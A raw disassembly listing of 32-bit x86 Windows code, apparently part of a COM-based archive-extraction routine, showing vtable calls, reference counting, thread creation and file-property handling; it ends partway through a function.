  401696:	3b 7d fc             	cmp    -0x4(%ebp),%edi
  401699:	72 cc                	jb     0x401667
  40169b:	3b f3                	cmp    %ebx,%esi
  40169d:	74 06                	je     0x4016a5
  40169f:	8b 06                	mov    (%esi),%eax
  4016a1:	56                   	push   %esi
  4016a2:	ff 50 08             	call   *0x8(%eax)
  4016a5:	33 c0                	xor    %eax,%eax
  4016a7:	40                   	inc    %eax
  4016a8:	eb 25                	jmp    0x4016cf
  4016aa:	e8 a7 fe ff ff       	call   0x401556
  4016af:	8d 4d e0             	lea    -0x20(%ebp),%ecx
  4016b2:	8b f8                	mov    %eax,%edi
  4016b4:	e8 bb 0e 01 00       	call   0x412574
  4016b9:	8b 06                	mov    (%esi),%eax
  4016bb:	56                   	push   %esi
  4016bc:	ff 50 08             	call   *0x8(%eax)
  4016bf:	8b c7                	mov    %edi,%eax
  4016c1:	eb 0c                	jmp    0x4016cf
  4016c3:	3b f3                	cmp    %ebx,%esi
  4016c5:	74 06                	je     0x4016cd
  4016c7:	8b 06                	mov    (%esi),%eax
  4016c9:	56                   	push   %esi
  4016ca:	ff 50 08             	call   *0x8(%eax)
  4016cd:	33 c0                	xor    %eax,%eax
  4016cf:	5e                   	pop    %esi
  4016d0:	5f                   	pop    %edi
  4016d1:	5b                   	pop    %ebx
  4016d2:	c9                   	leave
  4016d3:	c3                   	ret
  4016d4:	56                   	push   %esi
  4016d5:	8b f1                	mov    %ecx,%esi
  4016d7:	c7 46 04 60 c3 41 00 	movl   $0x41c360,0x4(%esi)
  4016de:	83 66 08 00          	andl   $0x0,0x8(%esi)
  4016e2:	c7 06 34 a5 41 00    	movl   $0x41a534,(%esi)
  4016e8:	c7 46 04 24 a5 41 00 	movl   $0x41a524,0x4(%esi)
  4016ef:	83 66 0c 00          	andl   $0x0,0xc(%esi)
  4016f3:	8d 4e 10             	lea    0x10(%esi),%ecx
  4016f6:	e8 f0 fd ff ff       	call   0x4014eb
  4016fb:	83 66 24 00          	andl   $0x0,0x24(%esi)
  4016ff:	8d 4e 28             	lea    0x28(%esi),%ecx
  401702:	e8 e4 fd ff ff       	call   0x4014eb
  401707:	8b c6                	mov    %esi,%eax
  401709:	5e                   	pop    %esi
  40170a:	c3                   	ret
  40170b:	55                   	push   %ebp
  40170c:	8b ec                	mov    %esp,%ebp
  40170e:	68 24 c4 41 00       	push   $0x41c424
  401713:	ff 75 0c             	push   0xc(%ebp)
  401716:	e8 94 fc ff ff       	call   0x4013af
  40171b:	85 c0                	test   %eax,%eax
  40171d:	59                   	pop    %ecx
  40171e:	59                   	pop    %ecx
  40171f:	74 1d                	je     0x40173e
  401721:	8b 45 08             	mov    0x8(%ebp),%eax
  401724:	8b c8                	mov    %eax,%ecx
  401726:	f7 d9                	neg    %ecx
  401728:	8d 50 04             	lea    0x4(%eax),%edx
  40172b:	1b c9                	sbb    %ecx,%ecx
  40172d:	23 ca                	and    %edx,%ecx
  40172f:	8b 55 10             	mov    0x10(%ebp),%edx
  401732:	89 0a                	mov    %ecx,(%edx)
  401734:	8b 08                	mov    (%eax),%ecx
  401736:	50                   	push   %eax
  401737:	ff 51 04             	call   *0x4(%ecx)
  40173a:	33 c0                	xor    %eax,%eax
  40173c:	eb 18                	jmp    0x401756
  40173e:	68 80 a4 41 00       	push   $0x41a480
  401743:	ff 75 0c             	push   0xc(%ebp)
  401746:	e8 64 fc ff ff       	call   0x4013af
  40174b:	85 c0                	test   %eax,%eax
  40174d:	59                   	pop    %ecx
  40174e:	59                   	pop    %ecx
  40174f:	75 d0                	jne    0x401721
  401751:	b8 02 40 00 80       	mov    $0x80004002,%eax
  401756:	5d                   	pop    %ebp
  401757:	c2 0c 00             	ret    $0xc
  40175a:	56                   	push   %esi
  40175b:	8b f1                	mov    %ecx,%esi
  40175d:	ff 76 28             	push   0x28(%esi)
  401760:	e8 05 7b 01 00       	call   0x41926a
  401765:	8b 46 24             	mov    0x24(%esi),%eax
  401768:	85 c0                	test   %eax,%eax
  40176a:	59                   	pop    %ecx
  40176b:	74 06                	je     0x401773
  40176d:	8b 08                	mov    (%eax),%ecx
  40176f:	50                   	push   %eax
  401770:	ff 51 08             	call   *0x8(%ecx)
  401773:	ff 76 10             	push   0x10(%esi)
  401776:	e8 ef 7a 01 00       	call   0x41926a
  40177b:	8b 76 0c             	mov    0xc(%esi),%esi
  40177e:	85 f6                	test   %esi,%esi
  401780:	59                   	pop    %ecx
  401781:	74 06                	je     0x401789
  401783:	8b 06                	mov    (%esi),%eax
  401785:	56                   	push   %esi
  401786:	ff 50 08             	call   *0x8(%eax)
  401789:	5e                   	pop    %esi
  40178a:	c3                   	ret
  40178b:	83 6c 24 04 04       	subl   $0x4,0x4(%esp)
  401790:	e9 76 ff ff ff       	jmp    0x40170b
  401795:	56                   	push   %esi
  401796:	6a 01                	push   $0x1
  401798:	8b f1                	mov    %ecx,%esi
  40179a:	e8 d3 fc ff ff       	call   0x401472
  40179f:	8b 46 04             	mov    0x4(%esi),%eax
  4017a2:	8b 0e                	mov    (%esi),%ecx
  4017a4:	66 8b 54 24 08       	mov    0x8(%esp),%dx
  4017a9:	66 89 14 41          	mov    %dx,(%ecx,%eax,2)
  4017ad:	ff 46 04             	incl   0x4(%esi)
  4017b0:	8b 46 04             	mov    0x4(%esi),%eax
  4017b3:	8b 0e                	mov    (%esi),%ecx
  4017b5:	66 83 24 41 00       	andw   $0x0,(%ecx,%eax,2)
  4017ba:	8b c6                	mov    %esi,%eax
  4017bc:	5e                   	pop    %esi
  4017bd:	c2 04 00             	ret    $0x4
  4017c0:	55                   	push   %ebp
  4017c1:	8b ec                	mov    %esp,%ebp
  4017c3:	ff 75 0c             	push   0xc(%ebp)
  4017c6:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4017c9:	e8 03 fc ff ff       	call   0x4013d1
  4017ce:	ff 75 10             	push   0x10(%ebp)
  4017d1:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4017d4:	e8 e3 fc ff ff       	call   0x4014bc
  4017d9:	8b 45 08             	mov    0x8(%ebp),%eax
  4017dc:	5d                   	pop    %ebp
  4017dd:	c3                   	ret
  4017de:	56                   	push   %esi
  4017df:	8b 74 24 08          	mov    0x8(%esp),%esi
  4017e3:	ff 4e 08             	decl   0x8(%esi)
  4017e6:	8b 46 08             	mov    0x8(%esi),%eax
  4017e9:	75 10                	jne    0x4017fb
  4017eb:	8b ce                	mov    %esi,%ecx
  4017ed:	e8 68 ff ff ff       	call   0x40175a
  4017f2:	56                   	push   %esi
  4017f3:	e8 72 7a 01 00       	call   0x41926a
  4017f8:	59                   	pop    %ecx
  4017f9:	33 c0                	xor    %eax,%eax
  4017fb:	5e                   	pop    %esi
  4017fc:	c2 04 00             	ret    $0x4
  4017ff:	55                   	push   %ebp
  401800:	8b ec                	mov    %esp,%ebp
  401802:	68 24 c4 41 00       	push   $0x41c424
  401807:	ff 75 0c             	push   0xc(%ebp)
  40180a:	e8 a0 fb ff ff       	call   0x4013af
  40180f:	85 c0                	test   %eax,%eax
  401811:	59                   	pop    %ecx
  401812:	59                   	pop    %ecx
  401813:	74 12                	je     0x401827
  401815:	8b 45 08             	mov    0x8(%ebp),%eax
  401818:	8b 4d 10             	mov    0x10(%ebp),%ecx
  40181b:	89 01                	mov    %eax,(%ecx)
  40181d:	8b 08                	mov    (%eax),%ecx
  40181f:	50                   	push   %eax
  401820:	ff 51 04             	call   *0x4(%ecx)
  401823:	33 c0                	xor    %eax,%eax
  401825:	eb 18                	jmp    0x40183f
  401827:	68 a0 a3 41 00       	push   $0x41a3a0
  40182c:	ff 75 0c             	push   0xc(%ebp)
  40182f:	e8 7b fb ff ff       	call   0x4013af
  401834:	85 c0                	test   %eax,%eax
  401836:	59                   	pop    %ecx
  401837:	59                   	pop    %ecx
  401838:	75 db                	jne    0x401815
  40183a:	b8 02 40 00 80       	mov    $0x80004002,%eax
  40183f:	5d                   	pop    %ebp
  401840:	c2 0c 00             	ret    $0xc
  401843:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  401847:	ff 49 04             	decl   0x4(%ecx)
  40184a:	8b 41 04             	mov    0x4(%ecx),%eax
  40184d:	75 09                	jne    0x401858
  40184f:	8b 01                	mov    (%ecx),%eax
  401851:	6a 01                	push   $0x1
  401853:	ff 50 18             	call   *0x18(%eax)
  401856:	33 c0                	xor    %eax,%eax
  401858:	c2 04 00             	ret    $0x4
  40185b:	56                   	push   %esi
  40185c:	8b f1                	mov    %ecx,%esi
  40185e:	8d 4e 08             	lea    0x8(%esi),%ecx
  401861:	c7 06 58 a5 41 00    	movl   $0x41a558,(%esi)
  401867:	e8 fa 0a 01 00       	call   0x412366
  40186c:	f6 44 24 08 01       	testb  $0x1,0x8(%esp)
  401871:	74 07                	je     0x40187a
  401873:	56                   	push   %esi
  401874:	e8 f1 79 01 00       	call   0x41926a
  401879:	59                   	pop    %ecx
  40187a:	8b c6                	mov    %esi,%eax
  40187c:	5e                   	pop    %esi
  40187d:	c2 04 00             	ret    $0x4
  401880:	55                   	push   %ebp
  401881:	8b ec                	mov    %esp,%ebp
  401883:	51                   	push   %ecx
  401884:	56                   	push   %esi
  401885:	57                   	push   %edi
  401886:	ff 75 08             	push   0x8(%ebp)
  401889:	8b f1                	mov    %ecx,%esi
  40188b:	8d 4e 0c             	lea    0xc(%esi),%ecx
  40188e:	e8 26 1e 01 00       	call   0x4136b9
  401893:	ff 75 0c             	push   0xc(%ebp)
  401896:	8d 7e 10             	lea    0x10(%esi),%edi
  401899:	8b cf                	mov    %edi,%ecx
  40189b:	e8 63 fb ff ff       	call   0x401403
  4018a0:	6a 5c                	push   $0x5c
  4018a2:	8b cf                	mov    %edi,%ecx
  4018a4:	e8 ec fe ff ff       	call   0x401795
  4018a9:	33 ff                	xor    %edi,%edi
  4018ab:	8d 45 fc             	lea    -0x4(%ebp),%eax
  4018ae:	50                   	push   %eax
  4018af:	57                   	push   %edi
  4018b0:	56                   	push   %esi
  4018b1:	68 3c 13 40 00       	push   $0x40133c
  4018b6:	57                   	push   %edi
  4018b7:	57                   	push   %edi
  4018b8:	89 35 64 e9 41 00    	mov    %esi,0x41e964
  4018be:	89 3d 6c e9 41 00    	mov    %edi,0x41e96c
  4018c4:	ff 15 94 a1 41 00    	call   *0x41a194
  4018ca:	83 3d c4 e9 41 00 02 	cmpl   $0x2,0x41e9c4
  4018d1:	a3 68 e9 41 00       	mov    %eax,0x41e968
  4018d6:	74 05                	je     0x4018dd
  4018d8:	e8 cd 73 00 00       	call   0x408caa
  4018dd:	6a ff                	push   $0xffffffff
  4018df:	ff 35 68 e9 41 00    	push   0x41e968
  4018e5:	ff 15 90 a1 41 00    	call   *0x41a190
  4018eb:	a1 6c e9 41 00       	mov    0x41e96c,%eax
  4018f0:	3b c7                	cmp    %edi,%eax
  4018f2:	89 3d 58 ea 41 00    	mov    %edi,0x41ea58
  4018f8:	74 32                	je     0x40192c
  4018fa:	83 f8 01             	cmp    $0x1,%eax
  4018fd:	74 21                	je     0x401920
  4018ff:	83 f8 02             	cmp    $0x2,%eax
  401902:	74 18                	je     0x40191c
  401904:	83 f8 03             	cmp    $0x3,%eax
  401907:	74 0f                	je     0x401918
  401909:	83 f8 67             	cmp    $0x67,%eax
  40190c:	7e 05                	jle    0x401913
  40190e:	83 f8 6b             	cmp    $0x6b,%eax
  401911:	7e 7d                	jle    0x401990
  401913:	50                   	push   %eax
  401914:	6a 14                	push   $0x14
  401916:	eb 4b                	jmp    0x401963
  401918:	6a 12                	push   $0x12
  40191a:	eb 06                	jmp    0x401922
  40191c:	6a 13                	push   $0x13
  40191e:	eb 02                	jmp    0x401922
  401920:	6a 11                	push   $0x11
  401922:	57                   	push   %edi
  401923:	e8 de 7c 00 00       	call   0x409606
  401928:	59                   	pop    %ecx
  401929:	59                   	pop    %ecx
  40192a:	eb 64                	jmp    0x401990
  40192c:	39 3d 60 ea 41 00    	cmp    %edi,0x41ea60
  401932:	75 5c                	jne    0x401990
  401934:	8d 45 08             	lea    0x8(%ebp),%eax
  401937:	50                   	push   %eax
  401938:	ff 35 68 e9 41 00    	push   0x41e968
  40193e:	ff 15 8c a1 41 00    	call   *0x41a18c
  401944:	85 c0                	test   %eax,%eax
  401946:	8b 4d 08             	mov    0x8(%ebp),%ecx
  401949:	74 08                	je     0x401953
  40194b:	3b cf                	cmp    %edi,%ecx
  40194d:	75 04                	jne    0x401953
  40194f:	33 c0                	xor    %eax,%eax
  401951:	eb 42                	jmp    0x401995
  401953:	b8 00 00 07 80       	mov    $0x80070000,%eax
  401958:	8b d1                	mov    %ecx,%edx
  40195a:	23 d0                	and    %eax,%edx
  40195c:	3b d0                	cmp    %eax,%edx
  40195e:	74 06                	je     0x401966
  401960:	51                   	push   %ecx
  401961:	6a 21                	push   $0x21
  401963:	57                   	push   %edi
  401964:	eb 22                	jmp    0x401988
  401966:	81 e1 ff ff 00 00    	and    $0xffff,%ecx
  40196c:	83 f9 0e             	cmp    $0xe,%ecx
  40196f:	75 09                	jne    0x40197a
  401971:	83 3d c8 e9 41 00 ff 	cmpl   $0xffffffff,0x41e9c8
  401978:	74 16                	je     0x401990
  40197a:	51                   	push   %ecx
  40197b:	ff 15 84 a1 41 00    	call   *0x41a184
  401981:	ff 75 08             	push   0x8(%ebp)
  401984:	6a 22                	push   $0x22
  401986:	6a 01                	push   $0x1
  401988:	e8 79 7c 00 00       	call   0x409606
  40198d:	83 c4 0c             	add    $0xc,%esp
  401990:	b8 05 40 00 80       	mov    $0x80004005,%eax
  401995:	5f                   	pop    %edi
  401996:	5e                   	pop    %esi
  401997:	c9                   	leave
  401998:	c2 08 00             	ret    $0x8
  40199b:	80 3d 70 e9 41 00 00 	cmpb   $0x0,0x41e970
  4019a2:	75 1a                	jne    0x4019be
  4019a4:	e8 ad fb ff ff       	call   0x401556
  4019a9:	85 c0                	test   %eax,%eax
  4019ab:	75 11                	jne    0x4019be
  4019ad:	8b 44 24 04          	mov    0x4(%esp),%eax
  4019b1:	83 c0 fc             	add    $0xfffffffc,%eax
  4019b4:	8b 08                	mov    (%eax),%ecx
  4019b6:	6a 6b                	push   $0x6b
  4019b8:	50                   	push   %eax
  4019b9:	ff 51 1c             	call   *0x1c(%ecx)
  4019bc:	eb 11                	jmp    0x4019cf
  4019be:	ff 74 24 08          	push   0x8(%esp)
  4019c2:	ff 35 74 e9 41 00    	push   0x41e974
  4019c8:	e8 cb f7 ff ff       	call   0x401198
  4019cd:	59                   	pop    %ecx
  4019ce:	59                   	pop    %ecx
  4019cf:	c2 08 00             	ret    $0x8
  4019d2:	55                   	push   %ebp
  4019d3:	8b ec                	mov    %esp,%ebp
  4019d5:	51                   	push   %ecx
  4019d6:	51                   	push   %ecx
  4019d7:	53                   	push   %ebx
  4019d8:	56                   	push   %esi
  4019d9:	57                   	push   %edi
  4019da:	68 e8 01 00 00       	push   $0x1e8
  4019df:	e8 8c 78 01 00       	call   0x419270
  4019e4:	33 ff                	xor    %edi,%edi
  4019e6:	3b c7                	cmp    %edi,%eax
  4019e8:	59                   	pop    %ecx
  4019e9:	74 09                	je     0x4019f4
  4019eb:	8b c8                	mov    %eax,%ecx
  4019ed:	e8 78 47 01 00       	call   0x41616a
  4019f2:	eb 02                	jmp    0x4019f6
  4019f4:	33 c0                	xor    %eax,%eax
  4019f6:	50                   	push   %eax
  4019f7:	8d 4d f8             	lea    -0x8(%ebp),%ecx
  4019fa:	e8 4f 19 01 00       	call   0x41334e
  4019ff:	8b 75 08             	mov    0x8(%ebp),%esi
  401a02:	8b 06                	mov    (%esi),%eax
  401a04:	57                   	push   %edi
  401a05:	57                   	push   %edi
  401a06:	57                   	push   %edi
  401a07:	57                   	push   %edi
  401a08:	56                   	push   %esi
  401a09:	89 7d fc             	mov    %edi,-0x4(%ebp)
  401a0c:	ff 50 10             	call   *0x10(%eax)
  401a0f:	8b 06                	mov    (%esi),%eax
  401a11:	8d 4d fc             	lea    -0x4(%ebp),%ecx
  401a14:	51                   	push   %ecx
  401a15:	68 90 a3 41 00       	push   $0x41a390
  401a1a:	56                   	push   %esi
  401a1b:	ff 10                	call   *(%eax)
  401a1d:	3b c7                	cmp    %edi,%eax
  401a1f:	75 6f                	jne    0x401a90
  401a21:	6a 0c                	push   $0xc
  401a23:	e8 48 78 01 00       	call   0x419270
  401a28:	3b c7                	cmp    %edi,%eax
  401a2a:	59                   	pop    %ecx
  401a2b:	74 19                	je     0x401a46
  401a2d:	c7 40 04 60 c3 41 00 	movl   $0x41c360,0x4(%eax)
  401a34:	89 78 08             	mov    %edi,0x8(%eax)
  401a37:	c7 00 e0 a4 41 00    	movl   $0x41a4e0,(%eax)
  401a3d:	c7 40 04 d0 a4 41 00 	movl   $0x41a4d0,0x4(%eax)
  401a44:	eb 02                	jmp    0x401a48
  401a46:	33 c0                	xor    %eax,%eax
  401a48:	8b 5d f8             	mov    -0x8(%ebp),%ebx
  401a4b:	50                   	push   %eax
  401a4c:	68 90 b4 41 00       	push   $0x41b490
  401a51:	ff 75 fc             	push   -0x4(%ebp)
  401a54:	53                   	push   %ebx
  401a55:	e8 e5 f6 ff ff       	call   0x40113f
  401a5a:	83 c4 10             	add    $0x10,%esp
  401a5d:	3b c7                	cmp    %edi,%eax
  401a5f:	75 32                	jne    0x401a93
  401a61:	83 3d 6c ea 41 00 02 	cmpl   $0x2,0x41ea6c
  401a68:	8b 75 0c             	mov    0xc(%ebp),%esi
  401a6b:	74 0c                	je     0x401a79
  401a6d:	ff 36                	push   (%esi)
  401a6f:	e8 73 1f 00 00       	call   0x4039e7
  401a74:	85 c0                	test   %eax,%eax
  401a76:	59                   	pop    %ecx
  401a77:	74 32                	je     0x401aab
  401a79:	6a 44                	push   $0x44
  401a7b:	e8 f0 77 01 00       	call   0x419270
  401a80:	3b c7                	cmp    %edi,%eax
  401a82:	59                   	pop    %ecx
  401a83:	74 44                	je     0x401ac9
  401a85:	8b c8                	mov    %eax,%ecx
  401a87:	e8 48 fc ff ff       	call   0x4016d4
  401a8c:	8b d8                	mov    %eax,%ebx
  401a8e:	eb 3b                	jmp    0x401acb
  401a90:	8b 5d f8             	mov    -0x8(%ebp),%ebx
  401a93:	a0 70 e9 41 00       	mov    0x41e970,%al
  401a98:	f6 d8                	neg    %al
  401a9a:	1b c0                	sbb    %eax,%eax
  401a9c:	83 e0 0b             	and    $0xb,%eax
  401a9f:	83 c0 08             	add    $0x8,%eax
  401aa2:	50                   	push   %eax
  401aa3:	57                   	push   %edi
  401aa4:	e8 5d 7b 00 00       	call   0x409606
  401aa9:	59                   	pop    %ecx
  401aaa:	59                   	pop    %ecx
  401aab:	8b 45 fc             	mov    -0x4(%ebp),%eax
  401aae:	3b c7                	cmp    %edi,%eax
  401ab0:	74 06                	je     0x401ab8
  401ab2:	8b 08                	mov    (%eax),%ecx
  401ab4:	50                   	push   %eax
  401ab5:	ff 51 08             	call   *0x8(%ecx)
  401ab8:	3b df                	cmp    %edi,%ebx
  401aba:	74 06                	je     0x401ac2
  401abc:	8b 03                	mov    (%ebx),%eax
  401abe:	53                   	push   %ebx
  401abf:	ff 50 08             	call   *0x8(%eax)
  401ac2:	b8 05 40 00 80       	mov    $0x80004005,%eax
  401ac7:	eb 33                	jmp    0x401afc
  401ac9:	33 db                	xor    %ebx,%ebx
  401acb:	ff 75 fc             	push   -0x4(%ebp)
  401ace:	e8 05 fb ff ff       	call   0x4015d8
  401ad3:	59                   	pop    %ecx
  401ad4:	ff 36                	push   (%esi)
  401ad6:	8b 75 f8             	mov    -0x8(%ebp),%esi
  401ad9:	56                   	push   %esi
  401ada:	8b cb                	mov    %ebx,%ecx
  401adc:	e8 9f fd ff ff       	call   0x401880
  401ae1:	8b d8                	mov    %eax,%ebx
  401ae3:	8b 45 fc             	mov    -0x4(%ebp),%eax
  401ae6:	3b c7                	cmp    %edi,%eax
  401ae8:	74 06                	je     0x401af0
  401aea:	8b 08                	mov    (%eax),%ecx
  401aec:	50                   	push   %eax
  401aed:	ff 51 08             	call   *0x8(%ecx)
  401af0:	3b f7                	cmp    %edi,%esi
  401af2:	74 06                	je     0x401afa
  401af4:	8b 06                	mov    (%esi),%eax
  401af6:	56                   	push   %esi
  401af7:	ff 50 08             	call   *0x8(%eax)
  401afa:	8b c3                	mov    %ebx,%eax
  401afc:	5f                   	pop    %edi
  401afd:	5e                   	pop    %esi
  401afe:	5b                   	pop    %ebx
  401aff:	c9                   	leave
  401b00:	c3                   	ret
  401b01:	83 6c 24 04 04       	subl   $0x4,0x4(%esp)
  401b06:	e9 d3 fc ff ff       	jmp    0x4017de
  401b0b:	55                   	push   %ebp
  401b0c:	8b ec                	mov    %esp,%ebp
  401b0e:	83 ec 4c             	sub    $0x4c,%esp
  401b11:	53                   	push   %ebx
  401b12:	57                   	push   %edi
  401b13:	33 ff                	xor    %edi,%edi
  401b15:	39 3d 60 ea 41 00    	cmp    %edi,0x41ea60
  401b1b:	74 0a                	je     0x401b27
  401b1d:	b8 04 40 00 80       	mov    $0x80004004,%eax
  401b22:	e9 3e 03 00 00       	jmp    0x401e65
  401b27:	56                   	push   %esi
  401b28:	8b 75 08             	mov    0x8(%ebp),%esi
  401b2b:	8d 4e 24             	lea    0x24(%esi),%ecx
  401b2e:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  401b31:	e8 87 21 01 00       	call   0x413cbd
  401b36:	8b 46 0c             	mov    0xc(%esi),%eax
  401b39:	8d 55 c4             	lea    -0x3c(%ebp),%edx
  401b3c:	52                   	push   %edx
  401b3d:	6a 03                	push   $0x3
  401b3f:	ff 75 0c             	push   0xc(%ebp)
  401b42:	66 89 7d c4          	mov    %di,-0x3c(%ebp)
  401b46:	66 89 7d c6          	mov    %di,-0x3a(%ebp)
  401b4a:	8b 08                	mov    (%eax),%ecx
  401b4c:	50                   	push   %eax
  401b4d:	ff 51 18             	call   *0x18(%ecx)
  401b50:	3b c7                	cmp    %edi,%eax
  401b52:	74 11                	je     0x401b65
  401b54:	8b f8                	mov    %eax,%edi
  401b56:	8d 4d c4             	lea    -0x3c(%ebp),%ecx
  401b59:	e8 16 0a 01 00       	call   0x412574
  401b5e:	8b c7                	mov    %edi,%eax
  401b60:	e9 ff 02 00 00       	jmp    0x401e64
  401b65:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  401b68:	e8 7e f9 ff ff       	call   0x4014eb
  401b6d:	66 39 7d c4          	cmp    %di,-0x3c(%ebp)
  401b71:	0f 84 d0 02 00 00    	je     0x401e47
  401b77:	66 83 7d c4 08       	cmpw   $0x8,-0x3c(%ebp)
  401b7c:	0f 85 c5 02 00 00    	jne    0x401e47
  401b82:	ff 75 cc             	push   -0x34(%ebp)
  401b85:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  401b88:	e8 76 f8 ff ff       	call   0x401403
  401b8d:	8d 45 f0             	lea    -0x10(%ebp),%eax
  401b90:	50                   	push   %eax
  401b91:	8d 46 10             	lea    0x10(%esi),%eax
  401b94:	50                   	push   %eax
  401b95:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  401b98:	50                   	push   %eax
  401b99:	8d 5e 28             	lea    0x28(%esi),%ebx
  401b9c:	e8 1f fc ff ff       	call   0x4017c0
  401ba1:	83 c4 0c             	add    $0xc,%esp
  401ba4:	50                   	push   %eax
  401ba5:	8b cb                	mov    %ebx,%ecx
  401ba7:	e8 90 f8 ff ff       	call   0x40143c
  401bac:	ff 75 e4             	push   -0x1c(%ebp)
  401baf:	e8 b6 76 01 00       	call   0x41926a
  401bb4:	39 7d 14             	cmp    %edi,0x14(%ebp)
  401bb7:	59                   	pop    %ecx
  401bb8:	0f 85 6f 02 00 00    	jne    0x401e2d
  401bbe:	8b 46 0c             	mov    0xc(%esi),%eax
  401bc1:	8d 55 d4             	lea    -0x2c(%ebp),%edx
  401bc4:	52                   	push   %edx
  401bc5:	6a 09                	push   $0x9
  401bc7:	ff 75 0c             	push   0xc(%ebp)
  401bca:	66 89 7d d4          	mov    %di,-0x2c(%ebp)
  401bce:	66 89 7d d6          	mov    %di,-0x2a(%ebp)
  401bd2:	8b 08                	mov    (%eax),%ecx
  401bd4:	50                   	push   %eax
  401bd5:	ff 51 18             	call   *0x18(%ecx)
  401bd8:	3b c7                	cmp    %edi,%eax
  401bda:	89 45 08             	mov    %eax,0x8(%ebp)
  401bdd:	74 19                	je     0x401bf8
  401bdf:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  401be2:	e8 8d 09 01 00       	call   0x412574
  401be7:	ff 75 f0             	push   -0x10(%ebp)
  401bea:	e8 7b 76 01 00       	call   0x41926a
  401bef:	8b 7d 08             	mov    0x8(%ebp),%edi
  401bf2:	59                   	pop    %ecx
  401bf3:	e9 5e ff ff ff       	jmp    0x401b56
  401bf8:	66 39 7d d4          	cmp    %di,-0x2c(%ebp)
  401bfc:	75 05                	jne    0x401c03
  401bfe:	89 7e 40             	mov    %edi,0x40(%esi)
  401c01:	eb 2d                	jmp    0x401c30
  401c03:	66 83 7d d4 13       	cmpw   $0x13,-0x2c(%ebp)
  401c08:	74 20                	je     0x401c2a
  401c0a:	6a 65                	push   $0x65
  401c0c:	8b 06                	mov    (%esi),%eax
  401c0e:	56                   	push   %esi
  401c0f:	ff 50 1c             	call   *0x1c(%eax)
  401c12:	8b f8                	mov    %eax,%edi
  401c14:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  401c17:	e8 58 09 01 00       	call   0x412574
  401c1c:	ff 75 f0             	push   -0x10(%ebp)
  401c1f:	e8 46 76 01 00       	call   0x41926a
  401c24:	59                   	pop    %ecx
  401c25:	e9 2c ff ff ff       	jmp    0x401b56
  401c2a:	8b 45 dc             	mov    -0x24(%ebp),%eax
  401c2d:	89 46 40             	mov    %eax,0x40(%esi)
  401c30:	8b 46 0c             	mov    0xc(%esi),%eax
  401c33:	8b 08                	mov    (%eax),%ecx
  401c35:	8d 55 d4             	lea    -0x2c(%ebp),%edx
  401c38:	52                   	push   %edx
  401c39:	6a 06                	push   $0x6
  401c3b:	ff 75 0c             	push   0xc(%ebp)
  401c3e:	50                   	push   %eax
  401c3f:	ff 51 18             	call   *0x18(%ecx)
  401c42:	3b c7                	cmp    %edi,%eax
  401c44:	89 45 08             	mov    %eax,0x8(%ebp)
  401c47:	75 96                	jne    0x401bdf
  401c49:	33 c0                	xor    %eax,%eax
  401c4b:	66 39 7d dc          	cmp    %di,-0x24(%ebp)
  401c4f:	8d 55 d4             	lea    -0x2c(%ebp),%edx
  401c52:	0f 95 c0             	setne  %al
  401c55:	52                   	push   %edx
  401c56:	6a 0c                	push   $0xc
  401c58:	ff 75 0c             	push   0xc(%ebp)
  401c5b:	89 46 3c             	mov    %eax,0x3c(%esi)
  401c5e:	8b 46 0c             	mov    0xc(%esi),%eax
  401c61:	8b 08                	mov    (%eax),%ecx
  401c63:	50                   	push   %eax
  401c64:	ff 51 18             	call   *0x18(%ecx)
  401c67:	3b c7                	cmp    %edi,%eax
  401c69:	89 45 0c             	mov    %eax,0xc(%ebp)
  401c6c:	74 19                	je     0x401c87
  401c6e:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  401c71:	e8 fe 08 01 00       	call   0x412574
  401c76:	ff 75 f0             	push   -0x10(%ebp)
  401c79:	e8 ec 75 01 00       	call   0x41926a
  401c7e:	8b 7d 0c             	mov    0xc(%ebp),%edi
  401c81:	59                   	pop    %ecx
  401c82:	e9 cf fe ff ff       	jmp    0x401b56
  401c87:	0f b7 45 d4          	movzwl -0x2c(%ebp),%eax
  401c8b:	3b c7                	cmp    %edi,%eax
  401c8d:	74 1a                	je     0x401ca9
  401c8f:	83 f8 40             	cmp    $0x40,%eax
  401c92:	74 07                	je     0x401c9b
  401c94:	6a 66                	push   $0x66
  401c96:	e9 71 ff ff ff       	jmp    0x401c0c
  401c9b:	8b 45 dc             	mov    -0x24(%ebp),%eax
  401c9e:	89 46 34             	mov    %eax,0x34(%esi)
  401ca1:	8b 45 e0             	mov    -0x20(%ebp),%eax
  401ca4:	89 46 38             	mov    %eax,0x38(%esi)
  401ca7:	eb 18                	jmp    0x401cc1
  401ca9:	8d 45 b4             	lea    -0x4c(%ebp),%eax
  401cac:	50                   	push   %eax
  401cad:	ff 15 a0 a1 41 00    	call   *0x41a1a0
  401cb3:	8d 46 34             	lea    0x34(%esi),%eax
  401cb6:	50                   	push   %eax
  401cb7:	8d 45 b4             	lea    -0x4c(%ebp),%eax
  401cba:	50                   	push   %eax
  401cbb:	ff 15 9c a1 41 00    	call   *0x41a19c
  401cc1:	39 7e 3c             	cmp    %edi,0x3c(%esi)
  401cc4:	74 17                	je     0x401cdd
  401cc6:	ff 33                	push   (%ebx)
  401cc8:	e8 1a 1d 00 00       	call   0x4039e7
  401ccd:	85 c0                	test   %eax,%eax
  401ccf:	59                   	pop    %ecx
  401cd0:	0f 85 3e ff ff ff    	jne    0x401c14
  401cd6:	6a 68                	push   $0x68
  401cd8:	e9 2f ff ff ff       	jmp    0x401c0c
  401cdd:	8b 03                	mov    (%ebx),%eax
  401cdf:	8d 4e 34             	lea    0x34(%esi),%ecx
  401ce2:	51                   	push   %ecx
  401ce3:	50                   	push   %eax
  401ce4:	e8 94 19 00 00       	call   0x40367d
  401ce9:	83 f8 ff             	cmp    $0xffffffff,%eax
  401cec:	59                   	pop    %ecx
  401ced:	59                   	pop    %ecx
  401cee:	0f 84 25 01 00 00    	je     0x401e19
  401cf4:	83 f8 01             	cmp    $0x1,%eax
  401cf7:	0f 84 12 01 00 00    	je     0x401e0f
  401cfd:	6a 18                	push   $0x18
  401cff:	e8 6c 75 01 00       	call   0x419270
  401d04:	3b c7                	cmp    %edi,%eax
  401d06:	59                   	pop    %ecx
  401d07:	74 0f                	je     0x401d18
